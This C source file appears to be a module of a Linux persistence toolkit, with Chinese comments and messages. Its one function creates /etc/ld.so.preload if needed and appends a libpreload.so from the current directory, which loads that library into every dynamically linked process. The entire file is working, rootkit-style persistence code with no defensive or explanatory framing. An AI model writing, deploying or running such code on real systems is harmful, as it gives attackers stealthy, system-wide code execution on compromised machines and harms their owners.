#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "linux_persistence_ld_preload.h"

#ifdef LD_PRELOAD_MOD
void setup_ld_preload_persistence() {
    printf("设置LD_PRELOAD持久化...\n");
    const char* ld_preload_path = "/etc/ld.so.preload";

    // 阶段 1: 检查文件存在性和写入权限
    // 如果文件不存在，尝试创建文件
    if (access(ld_preload_path, F_OK) != 0) {
        FILE *new_file = fopen(ld_preload_path, "w");
        if (new_file) {
            fclose(new_file);
            printf("ld.so.preload 文件已创建。\n");
        } else {
            perror("无法创建 ld.so.preload 文件");
            return;
        }
    }

    // 检查是否有写权限到 ld.so.preload 文件
    if (access(ld_preload_path, W_OK) != 0) {
        perror("没有写权限到 ld.so.preload 文件");
        return;
    }

    // 阶段 2: 执行写入操作
    FILE *ld_preload_file = fopen(ld_preload_path, "a");
    if (ld_preload_file) {
        char* current_dir = getcwd(NULL, 0);
        if (current_dir) {
            fprintf(ld_preload_file, "%s/libpreload.so\n", current_dir); // 添加当前目录下的 libpreload.so 共享库路径
            free(current_dir);
            fclose(ld_preload_file);
            printf("持久化命令已添加到LD_PRELOAD。\n");
        } else {
            fclose(ld_preload_file);
            perror("无法获取当前目录");
        }
    } else {
        perror("无法打开 ld.so.preload 文件进行写入");
    }
}
#endif
